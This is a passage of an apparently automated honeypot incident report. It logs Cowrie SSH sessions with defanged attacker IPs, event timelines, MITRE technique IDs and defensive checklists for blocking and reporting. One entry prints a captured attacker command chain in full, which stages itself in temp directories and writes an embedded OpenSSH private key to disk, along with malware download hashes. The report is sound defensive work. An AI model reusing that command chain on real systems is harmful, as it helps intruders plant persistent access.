| `2026-08-23 06:26:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 06:26:02` | `cowrie.direct-tcpip.data` |
| `2026-08-23 06:26:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9376162649ea

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-23 06:26 |
| **Last Seen** | 2026-08-23 06:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:26:44` | `cowrie.session.connect` |
| `2026-08-23 06:26:44` | `cowrie.client.version` |
| `2026-08-23 06:26:44` | `cowrie.client.kex` |
| `2026-08-23 06:26:45` | `cowrie.login.success` |
| `2026-08-23 06:26:45` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:26:45` | `cowrie.direct-tcpip.data` |
| `2026-08-23 06:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bfa4bb2ad9a

| Field | Detail |
|---|---|
| **Source IP** | `34.77.236[.]250` |
| **First Seen** | 2026-08-23 06:27 |
| **Last Seen** | 2026-08-23 06:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:27:14` | `cowrie.session.connect` |
| `2026-08-23 06:27:14` | `cowrie.login.success` |
| `2026-08-23 06:27:14` | `cowrie.session.params` |
| `2026-08-23 06:27:14` | `cowrie.command.input` |
| `2026-08-23 06:27:14` | `cowrie.command.input` |
| `2026-08-23 06:27:14` | `cowrie.command.failed` |
| `2026-08-23 06:27:14` | `cowrie.command.input` |
| `2026-08-23 06:27:15` | `cowrie.log.closed` |
| `2026-08-23 06:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.236[.]250` to AbuseIPDB if not already reported
- [ ] Block `34.77.236[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da61bb13a087

| Field | Detail |
|---|---|
| **Source IP** | `34.77.236[.]250` |
| **First Seen** | 2026-08-23 06:27 |
| **Last Seen** | 2026-08-23 06:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:27:27` | `cowrie.session.connect` |
| `2026-08-23 06:27:27` | `cowrie.login.success` |
| `2026-08-23 06:27:28` | `cowrie.session.params` |
| `2026-08-23 06:27:28` | `cowrie.command.input` |
| `2026-08-23 06:27:28` | `cowrie.command.failed` |
| `2026-08-23 06:27:30` | `cowrie.log.closed` |
| `2026-08-23 06:27:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.236[.]250` to AbuseIPDB if not already reported
- [ ] Block `34.77.236[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c7813145f83

| Field | Detail |
|---|---|
| **Source IP** | `34.77.236[.]250` |
| **First Seen** | 2026-08-23 06:27 |
| **Last Seen** | 2026-08-23 06:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:27:29` | `cowrie.session.connect` |
| `2026-08-23 06:27:29` | `cowrie.login.success` |
| `2026-08-23 06:27:30` | `cowrie.session.params` |
| `2026-08-23 06:27:30` | `cowrie.command.input` |
| `2026-08-23 06:27:30` | `cowrie.log.closed` |
| `2026-08-23 06:27:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.77.236[.]250` to AbuseIPDB if not already reported
- [ ] Block `34.77.236[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7c1959b10ca

| Field | Detail |
|---|---|
| **Source IP** | `85.239.149[.]72` |
| **First Seen** | 2026-08-23 06:29 |
| **Last Seen** | 2026-08-23 06:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:29:16` | `cowrie.session.connect` |
| `2026-08-23 06:29:16` | `cowrie.client.version` |
| `2026-08-23 06:29:16` | `cowrie.client.kex` |
| `2026-08-23 06:29:16` | `cowrie.login.success` |
| `2026-08-23 06:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.239.149[.]72` to AbuseIPDB if not already reported
- [ ] Block `85.239.149[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-933c3d98acfe

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-23 06:29 |
| **Last Seen** | 2026-08-23 06:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:29:16` | `cowrie.session.connect` |
| `2026-08-23 06:29:16` | `cowrie.client.version` |
| `2026-08-23 06:29:17` | `cowrie.client.kex` |
| `2026-08-23 06:29:17` | `cowrie.login.success` |
| `2026-08-23 06:29:18` | `cowrie.session.params` |
| `2026-08-23 06:29:18` | `cowrie.command.input` |
| `2026-08-23 06:29:19` | `cowrie.session.file_download` |
| `2026-08-23 06:29:19` | `cowrie.session.file_download` |
| `2026-08-23 06:29:19` | `cowrie.log.closed` |
| `2026-08-23 06:29:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66074298c307

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 06:35 |
| **Last Seen** | 2026-08-23 06:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:35:25` | `cowrie.session.connect` |
| `2026-08-23 06:35:25` | `cowrie.client.version` |
| `2026-08-23 06:35:25` | `cowrie.client.kex` |
| `2026-08-23 06:35:26` | `cowrie.login.success` |
| `2026-08-23 06:35:26` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:35:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 06:35:26` | `cowrie.direct-tcpip.data` |
| `2026-08-23 06:35:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b2cf4895703

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 06:35 |
| **Last Seen** | 2026-08-23 06:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:35:29` | `cowrie.session.connect` |
| `2026-08-23 06:35:29` | `cowrie.client.version` |
| `2026-08-23 06:35:29` | `cowrie.client.kex` |
| `2026-08-23 06:35:30` | `cowrie.login.success` |
| `2026-08-23 06:35:30` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:35:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 06:35:30` | `cowrie.direct-tcpip.data` |
| `2026-08-23 06:35:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bb2a93e0c6b

| Field | Detail |
|---|---|
| **Source IP** | `43.173.98[.]142` |
| **First Seen** | 2026-08-23 06:35 |
| **Last Seen** | 2026-08-23 06:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:35:37` | `cowrie.session.connect` |
| `2026-08-23 06:35:38` | `cowrie.client.version` |
| `2026-08-23 06:35:38` | `cowrie.client.kex` |
| `2026-08-23 06:35:39` | `cowrie.login.success` |
| `2026-08-23 06:35:40` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:35:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.98[.]142` to AbuseIPDB if not already reported
- [ ] Block `43.173.98[.]142` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edfdf2e9bad3

| Field | Detail |
|---|---|
| **Source IP** | `120.238.23[.]168` |
| **First Seen** | 2026-08-23 06:35 |
| **Last Seen** | 2026-08-23 06:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:35:45` | `cowrie.session.connect` |
| `2026-08-23 06:35:46` | `cowrie.client.version` |
| `2026-08-23 06:35:46` | `cowrie.client.kex` |
| `2026-08-23 06:35:49` | `cowrie.login.success` |
| `2026-08-23 06:35:50` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.238.23[.]168` to AbuseIPDB if not already reported
- [ ] Block `120.238.23[.]168` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb81bf1380cc

| Field | Detail |
|---|---|
| **Source IP** | `190.75.248[.]87` |
| **First Seen** | 2026-08-23 06:39 |
| **Last Seen** | 2026-08-23 06:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:39:45` | `cowrie.session.connect` |
| `2026-08-23 06:39:45` | `cowrie.client.version` |
| `2026-08-23 06:39:45` | `cowrie.client.kex` |
| `2026-08-23 06:39:47` | `cowrie.login.success` |
| `2026-08-23 06:39:47` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.75.248[.]87` to AbuseIPDB if not already reported
- [ ] Block `190.75.248[.]87` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16dc661fb198

| Field | Detail |
|---|---|
| **Source IP** | `218.29.231[.]106` |
| **First Seen** | 2026-08-23 06:39 |
| **Last Seen** | 2026-08-23 06:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:39:52` | `cowrie.session.connect` |
| `2026-08-23 06:39:53` | `cowrie.client.version` |
| `2026-08-23 06:39:53` | `cowrie.client.kex` |
| `2026-08-23 06:39:55` | `cowrie.login.success` |
| `2026-08-23 06:39:56` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.29.231[.]106` to AbuseIPDB if not already reported
- [ ] Block `218.29.231[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4473506763eb

| Field | Detail |
|---|---|
| **Source IP** | `207.175.205[.]217` |
| **First Seen** | 2026-08-23 06:39 |
| **Last Seen** | 2026-08-23 06:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:39:57` | `cowrie.session.connect` |
| `2026-08-23 06:39:57` | `cowrie.client.version` |
| `2026-08-23 06:39:57` | `cowrie.client.kex` |
| `2026-08-23 06:39:59` | `cowrie.login.success` |
| `2026-08-23 06:39:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.205[.]217` to AbuseIPDB if not already reported
- [ ] Block `207.175.205[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26e0bacfa8fe

| Field | Detail |
|---|---|
| **Source IP** | `45.55.133[.]80` |
| **First Seen** | 2026-08-23 06:44 |
| **Last Seen** | 2026-08-23 06:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:44:51` | `cowrie.session.connect` |
| `2026-08-23 06:44:51` | `cowrie.client.version` |
| `2026-08-23 06:44:51` | `cowrie.client.kex` |
| `2026-08-23 06:44:52` | `cowrie.login.success` |
| `2026-08-23 06:44:52` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.55.133[.]80` to AbuseIPDB if not already reported
- [ ] Block `45.55.133[.]80` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd6a37cbccec

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-08-23 06:44 |
| **Last Seen** | 2026-08-23 06:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:44:57` | `cowrie.session.connect` |
| `2026-08-23 06:44:58` | `cowrie.client.version` |
| `2026-08-23 06:44:58` | `cowrie.client.kex` |
| `2026-08-23 06:45:00` | `cowrie.login.success` |
| `2026-08-23 06:45:01` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:45:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-416bd4efc42f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 06:44 |
| **Last Seen** | 2026-08-23 06:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:44:59` | `cowrie.session.connect` |
| `2026-08-23 06:44:59` | `cowrie.client.version` |
| `2026-08-23 06:44:59` | `cowrie.client.kex` |
| `2026-08-23 06:45:00` | `cowrie.login.success` |
| `2026-08-23 06:45:00` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:45:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 06:45:00` | `cowrie.direct-tcpip.data` |
| `2026-08-23 06:45:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d6500baef66

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 06:45 |
| **Last Seen** | 2026-08-23 06:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:45:03` | `cowrie.session.connect` |
| `2026-08-23 06:45:03` | `cowrie.client.version` |
| `2026-08-23 06:45:03` | `cowrie.client.kex` |
| `2026-08-23 06:45:04` | `cowrie.login.success` |
| `2026-08-23 06:45:04` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:45:04` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 06:45:04` | `cowrie.direct-tcpip.data` |
| `2026-08-23 06:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fa5a2830889

| Field | Detail |
|---|---|
| **Source IP** | `172.239.71[.]239` |
| **First Seen** | 2026-08-23 06:45 |
| **Last Seen** | 2026-08-23 06:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:45:15` | `cowrie.session.connect` |
| `2026-08-23 06:45:15` | `cowrie.login.success` |
| `2026-08-23 06:45:15` | `cowrie.session.params` |
| `2026-08-23 06:45:15` | `cowrie.command.input` |
| `2026-08-23 06:45:15` | `cowrie.command.input` |
| `2026-08-23 06:45:15` | `cowrie.command.failed` |
| `2026-08-23 06:45:15` | `cowrie.command.input` |
| `2026-08-23 06:45:15` | `cowrie.command.failed` |
| `2026-08-23 06:45:15` | `cowrie.command.input` |
| `2026-08-23 06:45:16` | `cowrie.log.closed` |
| `2026-08-23 06:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.239.71[.]239` to AbuseIPDB if not already reported
- [ ] Block `172.239.71[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d36b5692fe22

| Field | Detail |
|---|---|
| **Source IP** | `221.182.185[.]190` |
| **First Seen** | 2026-08-23 06:49 |
| **Last Seen** | 2026-08-23 06:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:49:34` | `cowrie.session.connect` |
| `2026-08-23 06:49:35` | `cowrie.client.version` |
| `2026-08-23 06:49:35` | `cowrie.client.kex` |
| `2026-08-23 06:49:37` | `cowrie.login.success` |
| `2026-08-23 06:49:38` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.182.185[.]190` to AbuseIPDB if not already reported
- [ ] Block `221.182.185[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48958f879f45

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]81` |
| **First Seen** | 2026-08-23 06:49 |
| **Last Seen** | 2026-08-23 06:49 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:49:43` | `cowrie.session.connect` |
| `2026-08-23 06:49:44` | `cowrie.client.version` |
| `2026-08-23 06:49:44` | `cowrie.client.kex` |
| `2026-08-23 06:49:46` | `cowrie.login.success` |
| `2026-08-23 06:49:47` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]81` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcfd29eb32f0

| Field | Detail |
|---|---|
| **Source IP** | `41.42.6[.]111` |
| **First Seen** | 2026-08-23 06:49 |
| **Last Seen** | 2026-08-23 06:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:49:46` | `cowrie.session.connect` |
| `2026-08-23 06:49:47` | `cowrie.client.version` |
| `2026-08-23 06:49:47` | `cowrie.client.kex` |
| `2026-08-23 06:49:48` | `cowrie.login.success` |
| `2026-08-23 06:49:48` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:49:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.42.6[.]111` to AbuseIPDB if not already reported
- [ ] Block `41.42.6[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dab3022c3fad

| Field | Detail |
|---|---|
| **Source IP** | `41.42.6[.]111` |
| **First Seen** | 2026-08-23 06:49 |
| **Last Seen** | 2026-08-23 06:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:49:53` | `cowrie.session.connect` |
| `2026-08-23 06:49:54` | `cowrie.client.version` |
| `2026-08-23 06:49:54` | `cowrie.client.kex` |
| `2026-08-23 06:49:55` | `cowrie.login.success` |
| `2026-08-23 06:49:55` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:50:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.42.6[.]111` to AbuseIPDB if not already reported
- [ ] Block `41.42.6[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e06ea7323a30

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]6` |
| **First Seen** | 2026-08-23 06:52 |
| **Last Seen** | 2026-08-23 06:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:52:49` | `cowrie.session.connect` |
| `2026-08-23 06:52:49` | `cowrie.client.version` |
| `2026-08-23 06:52:49` | `cowrie.client.kex` |
| `2026-08-23 06:52:52` | `cowrie.login.success` |
| `2026-08-23 06:52:52` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]6` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ebbf2f84c91

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 06:54 |
| **Last Seen** | 2026-08-23 06:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:54:28` | `cowrie.session.connect` |
| `2026-08-23 06:54:28` | `cowrie.client.version` |
| `2026-08-23 06:54:29` | `cowrie.client.kex` |
| `2026-08-23 06:54:29` | `cowrie.login.success` |
